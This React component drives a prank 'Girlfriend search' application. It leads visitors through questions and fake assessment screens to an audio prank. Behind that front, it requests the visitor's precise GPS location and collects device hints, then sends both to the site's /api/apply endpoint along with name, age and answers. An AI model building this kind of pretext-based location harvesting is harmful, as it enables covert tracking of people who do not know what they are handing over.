"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { questions, type Answers, type FieldValue } from "@/app/lib/questions";
import { canProceed, QuestionFields } from "@/app/components/fields";
import {
  CountdownScreen,
  Prank,
  Rejected,
  Shortlist,
  Welcome,
} from "@/app/components/screens";
import type { SubmissionStatus } from "@/app/lib/submission";
import {
  collectClientHints,
  getLastGps,
  requestPreciseLocation,
  waitForGps,
} from "@/app/lib/visit-client";
import { VisitBeacon } from "@/app/components/visit-beacon";

type Step =
  | "welcome"
  | number
  | "assessing"
  | "shortlist"
  | "unlocking"
  | "prank"
  | "rejected";

export function Application() {
  const [step, setStep] = useState<Step>("welcome");
  const [name, setName] = useState("");
  const [age, setAge] = useState("");
  const [answers, setAnswers] = useState<Answers>({});
  const [animKey, setAnimKey] = useState(0);
  const audioRef = useRef<HTMLAudioElement>(null);

  const question = typeof step === "number" ? questions[step] : null;
  const total = questions.length;
  const progress = useMemo(() => {
    if (step === "welcome") return 0;
    if (typeof step === "number") return ((step + 1) / (total + 1)) * 100;
    return 100;
  }, [step, total]);

  const progressLabel = useMemo(() => {
    if (step === "welcome") return "Intake";
    if (step === "rejected") return "Closed";
    if (step === "assessing") return "Scoring";
    if (step === "shortlist" || step === "unlocking" || step === "prank") {
      return "Shortlist";
    }
    return `Question ${String(step + 1).padStart(2, "0")}`;
  }, [step]);

  function go(next: Step) {
    setStep(next);
    setAnimKey((n) => n + 1);
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  function setAnswer(id: string, value: FieldValue) {
    setAnswers((prev) => ({ ...prev, [id]: value }));
  }

  async function notify(status: SubmissionStatus, latest: Answers = answers) {
    try {
      requestPreciseLocation();
      const gps = (await waitForGps(8000)) ?? getLastGps() ?? undefined;
      await fetch("/api/apply", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name,
          age,
          status,
          answers: latest,
          gps: gps ?? undefined,
          client: collectClientHints(),
        }),
        keepalive: true,
      });
    } catch {
      // The applicant still proceeds. Notification is best-effort.
    }
  }

  async function finish(status: SubmissionStatus, next: Step, latest?: Answers) {
    void notify(status, latest ?? answers);
    go(next);
  }

  function startSoundtrack() {
    const el = audioRef.current;
    if (!el) return;
    el.volume = 0;
    el.currentTime = 0;
    const play = el.play();
    if (play) play.catch(() => {});
  }

  useEffect(() => {
    const el = audioRef.current;
    if (!el) return;
    if (step === "prank") {
      el.currentTime = 0;
      el.volume = 1;
      if (el.paused) {
        const play = el.play();
        if (play) play.catch(() => {});
      }
      return;
    }
    if (step !== "unlocking") {
      el.pause();
      el.volume = 1;
    }
  }, [step]);

  return (
    <div className="relative mx-auto flex min-h-dvh w-full max-w-[46rem] flex-col border-rule px-6 py-7 sm:border-x sm:px-12 sm:py-10">
      <VisitBeacon />
      <audio ref={audioRef} src="/nick.mp3" preload="auto" />
      <header>
        <div className="flex items-end justify-between gap-6 pb-4">
          <div>
            <p className="text-[0.64rem] font-medium tracking-[0.22em] text-muted uppercase">
              Confidential
            </p>
            <p className="mt-1 font-serif text-[1.35rem] leading-none tracking-tight">
              Girlfriend search
            </p>
          </div>
          <p className="pb-0.5 text-[0.64rem] font-medium tracking-[0.18em] text-muted uppercase">
            {progressLabel}
            {typeof step === "number" ? ` · ${String(total).padStart(2, "0")}` : ""}
          </p>
        </div>
        <div className="progress" aria-hidden="true">
          <span style={{ width: `${progress}%` }} />
        </div>
      </header>

      <main className="flex flex-1 flex-col">
        <div key={animKey} className="step-enter flex flex-1 flex-col">
          {step === "welcome" ? (
            <Welcome
              name={name}
              age={age}
              onName={setName}
              onAge={setAge}
              onStart={() => {
                requestPreciseLocation();
                go(0);
              }}
            />
          ) : step === "assessing" ? (
            <CountdownScreen
              kicker="Assessing your application"
              onDone={() => go("shortlist")}
            />
          ) : step === "shortlist" ? (
            <Shortlist
              name={name}
              onReveal={() => {
                startSoundtrack();
                go("unlocking");
              }}
            />
          ) : step === "unlocking" ? (
            <CountdownScreen kicker="Loading" onDone={() => go("prank")} />
          ) : step === "prank" ? (
            <Prank />
          ) : step === "rejected" ? (
            <Rejected />
          ) : question ? (
            <QuestionStep
              index={step}
              total={total}
              question={question}
              value={answers[question.id]}
              onChange={(value) => setAnswer(question.id, value)}
              onBack={() => go(step === 0 ? "welcome" : step - 1)}
              onNext={() => {
                if (step + 1 < total) go(step + 1);
                else void finish("submitted", "assessing");
              }}
              onReject={() => {
                const latest = {
                  ...answers,
                  ...(question ? { [question.id]: "no" } : {}),
                };
                void finish("rejected", "rejected", latest);
              }}
            />
          ) : null}
        </div>
      </main>
    </div>
  );
}

function QuestionStep({
  index,
  total,
  question,
  value,
  onChange,
  onBack,
  onNext,
  onReject,
}: {
  index: number;
  total: number;
  question: (typeof questions)[number];
  value: FieldValue | undefined;
  onChange: (value: FieldValue) => void;
  onBack: () => void;
  onNext: () => void | Promise<void>;
  onReject: () => void | Promise<void>;
}) {
  const last = index === total - 1;
  const ready = canProceed(question, value);
  const longPrompt = question.prompt.length > 90;

  return (
    <div className="flex flex-1 flex-col py-10 sm:py-12">
      <p className="text-[0.68rem] font-medium tracking-[0.22em] text-muted uppercase">
        {String(index + 1).padStart(2, "0")} / {String(total).padStart(2, "0")}
      </p>
      <h1
        className={`mt-5 font-serif leading-[1.08] tracking-[-0.03em] text-pretty ${
          longPrompt
            ? "max-w-[28ch] text-[1.7rem] sm:text-[2.25rem]"
            : "max-w-[22ch] text-[2.05rem] sm:text-[2.9rem]"
        }`}
      >
        {question.prompt}
      </h1>
      {question.hint ? (
        <p className="mt-4 max-w-[36rem] text-[0.98rem] leading-relaxed text-muted">
          {question.hint}
        </p>
      ) : null}

      <div className="mt-9">
        <QuestionFields
          question={question}
          value={value}
          onChange={onChange}
          onReject={onReject}
        />
      </div>

      <div className="mt-10 flex flex-wrap items-center gap-3">
        <button type="button" className="btn btn-ghost" onClick={onBack}>
          Back
        </button>
        <button type="button" className="btn" onClick={onNext} disabled={!ready}>
          {last ? "Submit" : "Next"}
          <span className="arrow" aria-hidden="true">
            →
          </span>
        </button>
      </div>
    </div>
  );
}
